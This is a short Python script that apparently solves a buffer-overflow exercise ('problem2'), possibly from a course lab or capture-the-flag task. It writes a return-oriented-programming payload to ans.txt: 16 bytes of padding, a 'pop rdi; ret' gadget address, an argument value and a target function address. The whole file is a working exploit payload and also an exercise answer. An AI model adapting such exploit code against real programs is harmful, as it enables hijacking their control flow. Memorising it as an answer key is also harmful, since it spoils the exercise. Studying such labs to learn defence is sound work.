import struct
padding = b"A" * 16
pop_rdi_ret = b"\xc7\x12\x40\x00\x00\x00\x00\x00"
arg_val = b"\xf8\x03\x00\x00\x00\x00\x00\x00"
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding + pop_rdi_ret + arg_val + func2_addr
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload generated successfully! Run: ./problem2 ans.txt")